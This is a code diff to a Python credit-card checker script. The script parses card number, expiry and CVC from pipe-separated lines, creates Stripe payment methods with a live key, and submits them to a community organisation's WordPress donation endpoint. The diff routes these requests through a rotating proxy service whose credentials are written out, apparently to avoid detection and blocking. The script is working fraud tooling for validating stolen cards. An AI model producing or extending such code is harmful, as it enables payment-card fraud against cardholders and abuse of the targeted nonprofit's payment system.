@@ -1,6 +1,10 @@
 import requests,re
 import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
+	proxy_str = "p.webshare.io:80:rotate-zlanvdvs:7zzew86qyip3"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -31,7 +35,7 @@ def Tele(ccx):
 	
 	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
@@ -64,7 +68,7 @@ def Tele(ccx):
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = requests.post(
+	response = session.post(
 	    'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
 	    headers=headers,
 	    data=data,
